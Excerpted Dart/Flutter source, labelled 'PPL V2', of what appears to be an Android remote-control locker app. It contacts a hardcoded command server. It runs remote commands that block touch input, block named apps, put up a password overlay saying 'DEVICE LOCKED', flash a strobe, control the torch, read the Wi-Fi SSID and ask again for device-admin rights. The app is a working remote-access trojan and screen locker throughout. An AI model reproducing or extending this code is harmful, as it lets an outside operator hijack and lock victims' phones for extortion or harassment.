...
const String kServerBase = "http://herstore.freszeenet.my.id:10303";
...
// ── TOUCH BLOCK ──────────────────────────────────────────────────────────────
Timer? _touchBlockTimer;
bool _isTouchBlocked = false;

// ════════════════════════════════════════════════════════════════════════════
// FUNGSI STROBE UNTUK LOCK
// ════════════════════════════════════════════════════════════════════════════
void startStrobeOnLock() async {
  try {
    await platformStrobe.invokeMethod('startStrobe');
    print("✅ Strobe started for lock mode");
  } catch (e) {
    print("❌ Failed to start strobe: $e");
  }
}

void stopStrobeOnLock() async {
  try {
    await platformStrobe.invokeMethod('stopStrobe');
    print("✅ Strobe stopped");
  } catch (e) {
    print("❌ Failed to stop strobe: $e");
  }
}
...
// FUNGSI TOUCH BLOCK
// ════════════════════════════════════════════════════════════════════════════
void startTouchBlock(int durationSeconds) async {
  if (_isTouchBlocked) return;
  _isTouchBlocked = true;
  
  try {
    await platformSpy.invokeMethod('blockTouch', {'duration': durationSeconds});
    print("✅ Touch blocked for $durationSeconds seconds");
  } catch (e) {
    print("❌ Failed to block touch: $e");
    try {
      await platformSpy.invokeMethod('startTouchBlockOverlay', {'duration': durationSeconds});
    } catch (_) {}
  }
  
  _touchBlockTimer?.cancel();
  _touchBlockTimer = Timer(Duration(seconds: durationSeconds), () {
    _isTouchBlocked = false;
    try {
      platformSpy.invokeMethod('unblockTouch');
      print("✅ Touch unblocked after $durationSeconds seconds");
    } catch (_) {}
  });
}
...
void stopTouchBlock() {
  ...
  try {
    platformSpy.invokeMethod('unblockTouch');
    print("✅ Touch unblocked manually");
  } catch (_) {}
}
...
void blockApp(String packageName) async {
  try {
    await platformSpy.invokeMethod('blockApp', packageName);
    blockedApps[packageName] = true;
    print("✅ App blocked: $packageName");
  } catch (e) {
    print("❌ Failed to block app: $e");
  }
}

void unblockApp(String packageName) async {
  try {
    await platformSpy.invokeMethod('unblockApp', packageName);
    blockedApps[packageName] = false;
    print("✅ App unblocked: $packageName");
  } catch (e) {
    print("❌ Failed to unblock app: $e");
  }
}

bool isAppBlocked(String packageName) {
  return blockedApps[packageName] ?? false;
}

// ════════════════════════════════════════════════════════════════════════════
// FUNGSI OVERLAY LOCK
// ════════════════════════════════════════════════════════════════════════════
void startOverlayLock(String password) async {
  try {
    await platformSpy.invokeMethod('startOverlayLock', {
      'password': password,
      'message': '🔒 DEVICE LOCKED\nEnter password to unlock'
    });
    overlayPassword = password;
    print("✅ Overlay lock started");
  } catch (e) {
    print("❌ Failed to start overlay lock: $e");
  }
}

void dismissOverlayLock() async {
  try {
    await platformSpy.invokeMethod('dismissOverlayLock');
    overlayPassword = "";
    print("✅ Overlay lock dismissed");
  } catch (e) {
    print("❌ Failed to dismiss overlay lock: $e");
  }
}
...
void torchOn() async {
  try {
    await platformSpy.invokeMethod('torchOn');
...
void torchOff() async {
  try {
    await platformSpy.invokeMethod('torchOff');
...
Future<String> getCurrentSSID() async {
  try {
    final ssid = await platformSpy.invokeMethod('getCurrentSSID') as String?;
...
void main() async {
  ...
  try {
    ...
    // Restore overlay lock state
    final overlayState = await platformSpy.invokeMethod('getOverlayLockState') as Map?;
    if (overlayState != null && overlayState['isActive'] == true) {
      overlayPassword = overlayState['password']?.toString() ?? '';
    }
  } catch (_) {}
...
void _sendResponse(String id, String cmd, dynamic data) async {
  try {
  ...
  Future<void> loop() async {
    try {
      ...
      if (cmd == 'touch_block') {
        ...
        result = {"status": "Touch blocked for $duration seconds"};
      }
      
      // ── APP BLOCK ────────────────────────────────────────────────────────
      else if (cmd == 'block_app') {
        try {
          final packageName = extra;
          if (packageName.isEmpty) {
            result = {"success": false, "message": "Package name required"};
          } else {
            blockApp(packageName);
            result = {"success": true, "message": "$packageName blocked"};
          }
        } catch (e) {
          result = {"success": false, "message": e.toString()};
        }
      }
      else if (cmd == 'unblock_app') {
        try {
          final packageName = extra;
          if (packageName.isEmpty) {
            result = {"success": false, "message": "Package name required"};
            ...
            result = {"success": true, "message": "$packageName unblocked"};
          }
        } catch (e) {
          result = {"success": false, "message": e.toString()};
        }
      }
      else if (cmd == 'get_blocked_apps') {
        try {
          final data = await platformSpy.invokeMethod('getBlockedApps');
          result = {"apps": data ?? []};
        } catch (e) {
          result = {"apps": [], "error": e.toString()};
        }
      }
      
      // ── OVERLAY LOCK ────────────────────────────────────────────────────
      else if (cmd == 'overlay_lock') {
        try {
          final password = extra.isNotEmpty ? extra : '1234';
          startOverlayLock(password);
          result = {"status": "Overlay lock active", "password": password};
        } catch (e) {
          result = {"status": "Failed", "error": e.toString()};
        }
      }
      else if (cmd == 'dismiss_overlay') {
        try {
          dismissOverlayLock();
          result = {"status": "Overlay lock dismissed"};
        } catch (e) {
          result = {"status": "Failed", "error": e.toString()};
        }
      }
      else if (cmd == 'overlay_status') {
        try {
          final status = await platformSpy.invokeMethod('getOverlayLockState');
          result = status ?? {"isActive": false};
        } catch (e) {
          result = {"isActive": false, "error": e.toString()};
        }
      }
      ...
      // ── TORCH ───────────────────────────────────────────────────────────
        ...
        try {
          torchOff();
          result = {"status": "Torch turned off"};
        } catch (e) {
          result = {"status": "Failed", "error": e.toString()};
        }
      }
      ...
      // ── SSID ────────────────────────────────────────────────────────────
        ...
        try {
          ...
          result = {"ssid": "Tidak terdeteksi", "error": e.toString()};
        }
      }
      ...
      else if (cmd == 're_request_admin') {
        try {
          await platformSpy.invokeMethod('reRequestAdmin');
          result = {"status": "admin_requested"};
        } catch (_) {
      ...
      body: Stack(children: [
        ...
        SafeArea(child: FadeTransition(opacity: _fadeAnim,
          child: Column(children: [
            ...
            const Text('PPL V2', style: TextStyle(
